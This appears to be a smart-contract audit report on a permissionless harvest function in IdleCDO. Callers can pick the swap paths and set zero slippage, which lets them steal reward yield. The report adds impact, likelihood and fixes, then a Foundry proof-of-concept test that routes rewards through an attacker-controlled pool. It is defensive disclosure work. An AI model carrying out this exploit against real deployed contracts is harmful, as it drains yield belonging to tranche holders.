### Title
Permissionless `harvest` lets any caller set swap paths and `amountOutMinimum = 0`, enabling full theft of reward-token yield - ([File: contracts/IdleCDO.sol](contracts/IdleCDO.sol))

### Summary
The Meter bridge PoC shows the essence of the bug class: an attacker crafts a swap call to a DEX router with a fully attacker-chosen `path` and no validation of who supplies the routing data. `IdleCDO.harvest` is permissionless and forwards caller-supplied `_extraData` (Uniswap V3 paths) and `_minAmount` slippage bounds into `_sellAllRewards`/`_sellReward`, which executes `exactInput` on a hardcoded router with `recipient: address(this)`. An unprivileged caller can pass a path through an attacker-controlled pool (or simply set every `minAmount` to 0 and sandwich the swaps), extracting up to 100% of accrued reward value from all tranche holders.

### Finding Description
`harvest` collects strategy reward tokens and sells them for the underlying via `_sellAllRewards`. That function decodes the swap paths from `_extraData` and takes per-reward minimum outputs from `_minAmount`, both supplied by the external caller with no access control and no sanity check [1](#0-0) . `_sellReward` then builds `ExactInputParams` with `path: _path`, `amountOutMinimum: _minAmount`, `recipient: address(this)` and calls `exactInput` on the Uniswap V3 router [2](#0-1) .

Because `recipient` is fixed to the CDO, the proceeds stay in the vault, but the *price* is entirely attacker-controlled:

- The attacker deploys a Uniswap V3 pool (or uses any thin pool) containing the reward token paired against a fake/dust token, then routes `reward → fakeToken → token` so the second hop executes against liquidity they own at a manipulated price.
- Alternatively, with `minAmount = 0` on the legitimate path, the attacker sandwiches `exactInput` (buy reward-token output cheaply before, dump after) and captures the slippage.

Either way the CDO sells its entire reward balance (`_amount == 0` defaults to the full contract balance [3](#0-2) ) for ~0 underlying. The same override exists on L2 variants (`IdleCDOArbitrum`, `IdleCDOAvax`, `IdleCDOBase`, `IdleCDOOptimism`, `IdleCDOPolygon`, `IdleCDOPolygonZK`), all permissionless with caller-supplied paths.

### Impact Explanation
Direct theft of unclaimed yield: all accrued reward tokens (COMP, CRV, governance rewards, etc.) held by the strategy/CDO at harvest time can be converted for essentially zero underlying. Since tranche NAV (`getContractValue`) only gains from the swapped proceeds [4](#0-3) , the stolen value is a permanent loss of yield that would otherwise have accrued to AA/BB holders per `_updateAccounting`/`_virtualPriceAux`. Loss per call equals the full pending reward balance, repeatable every time rewards accumulate.

### Likelihood Explanation
Any EOA can call `harvest`; there is no keeper/owner gate on the slippage parameters and the contract deliberately treats `minAmount` as caller input (intended for a trusted keeper). Reward tokens accumulate continuously, so an attacker can monitor pending rewards and execute the extraction atomically in one transaction whenever the pending value exceeds gas + pool-setup costs. No privileged action, default, or epoch state is required.

### Recommendation
- Restrict `harvest` (or at least the path/`minAmount` parameters) to an owner/manager-controlled keeper, or
- Validate each swap path on-chain: require the path to terminate in `token` (or `weth`) and enforce a minimum output derived from a manipulation-resistant price (e.g., TWAP or chainlink feed) rather than trusting caller-supplied `amountOutMinimum`, and
- Revert if the received amount is below a configured fraction of the oracle value of rewards sold.

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCDO} from "../contracts/IdleCDO.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";
import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";

contract HarvestSandwichTest is Test {
    // Fork mainnet at a block where the target IdleCDO holds claimable rewards.

    IdleCDO cdo = IdleCDO(CDO_ADDR);            // any deployed IdleCDO variant
    IERC20Detailed reward = IERC20Detailed(REWARD_TOKEN);

    function testRewardTheft() public {
        // 1. Force/await reward accrual on the strategy so the CDO/strategy
        //    holds a non-zero reward balance.
        uint256 rewardBal = reward.balanceOf(address(cdo /* or strategy */));
        require(rewardBal > 0, "no rewards");

        // 2. Attacker (any EOA) calls harvest with:
        //    - _minAmount = [0]               -> no slippage floor
        //    - _extraData  = abi.encode(paths) -> path routed through an
        //      attacker-controlled UniV3 pool: reward -> fakePool -> token
        bytes[] memory paths = new bytes[](1);
        paths[0] = abi.encodePacked(
            REWARD_TOKEN,
            uint24(3000),
            ATTACKER_POOL_TOKEN,   // pool owned/manipulated by attacker
            uint24(3000),
            cdo.token()
        );

        uint256[] memory minAmounts = new uint256[](1); // all zeros
        uint256[] memory sellAmounts = new uint256[](1); // 0 = full balance
        bool[] memory skip = new bool[](1);

        uint256 navBefore = cdo.getContractValue();
        uint256 attackerTokenBefore = IERC20Detailed(cdo.token()).balanceOf(address(this));

        cdo.harvest(
            false,               // _skipRewardCheck
            skip,
            minAmounts,          // amountOutMinimum = 0
            sellAmounts,         // sell entire reward balance
            abi.encode(paths)    // attacker-chosen path
        );

        // CDO received ~0 underlying for rewardBal of rewards; the difference
        // was captured by the attacker pool / sandwich position.
        uint256 navAfter = cdo.getContractValue();
        assertLt(navAfter, navBefore + rewardBal / 100);
        // attacker unwinds the pool leg and pockets the reward value
    }
}
